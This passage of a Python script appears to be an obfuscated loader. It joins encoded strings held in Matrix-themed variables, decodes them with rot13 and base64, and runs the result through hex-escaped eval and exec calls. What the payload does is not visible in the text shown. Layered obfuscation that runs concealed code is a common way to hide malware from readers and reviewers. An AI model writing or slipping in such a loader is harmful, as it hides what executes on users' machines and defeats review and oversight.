3AKZlf1AF8iY0Wln0VeomD3LGuCGHEkZUIdCG0aQDc6nJ9hVQ0tW1k4AmWprQMzKUt3ASk4ZmSprQZmWj0XozIiVQ0tMKMuoPtaKUt2Zyk4AwyprQMyKUt2ZIk4AmAprQLmKUt2BIk4AwyprQWyKUt3AIk4AzIprQL4KUt2AIk4AmuprQMwKUt2BIk4AwMprQp5KUtlBSk4AzEprQMzKUt3Zyk4AmOprQL4KUt2AIk4AmIprQpmKUtlBIk4ZwOprQWSKUt2ASk4AwIprQLmKUt2Eyk4AwEprQL1KUtlBSk4ZwxaXFNeVTI2LJjbW1k4AwAprQMzKUt2ASk4AwIprQLmKUt3Z1k4ZzIprQL0KUt2AIk4AwAprQMzKUt2ASk4AwIprQV4KUt3ASk4AmWprQL5KUt2MIk4AwyprQp0KUt3BIk4ZzAprQVjKUt3LIk4AwyprQMzKUt2MIk4ZwxaXFNeVTI2LJjbW1k4AwWprQL5KUt2MIk4AwSprQpmKUt2Z1k4AwyprQL5KUtlMIk4AmIprQMyKUt2BSk4AwIprQp4KUt2L1k4AwyprQL2KUt3BIk4ZwuprQMzKUt3Zyk4AwSprQLmKUt2L1k4AwIprQV5KUtlEIk4AwEprQL1KUt2Z1k4AxMprQL0KUt2AIk4ZwuprQV5WlxtXlOyqzSfXPqprQLmKUt2Myk4AwEprQL1KUt2Z1k4AmAprQWyKUt2ASk4AwIprQLmKUt2Myk4AwEprQL1KUtlBSk4AzWprQL1KUt3BIk4AzEprQLkKUt2Lyk4AwIprQplKUtlZSk4ZzAprQVjKUt3LIk4AwyprQMzKUt2MIk4ZwxaXD0XMKMuoPuwo21jnJkyXUcfnJVhMTIwo21jpzImpluvLKAyAwDhLwL0MTIwo2EyXTI2LJjbW1k4AzIprQL1KUt2MvpcXFxfWmkmqUWcozp+WljaMKuyLlpcXD=='
zion = '\x72\x6f\x74\x31\x33'
neo = eval('\x6d\x6f\x72\x70\x68\x65\x75\x73\x20') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x74\x72\x69\x6e\x69\x74\x79\x2c\x20\x7a\x69\x6f\x6e\x29') + eval('\x6f\x72\x61\x63\x6c\x65') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6b\x65\x79\x6d\x61\x6b\x65\x72\x20\x2c\x20\x7a\x69\x6f\x6e\x29')
eval(compile(base64.b64decode(eval('\x6e\x65\x6f')),'<string>','exec'))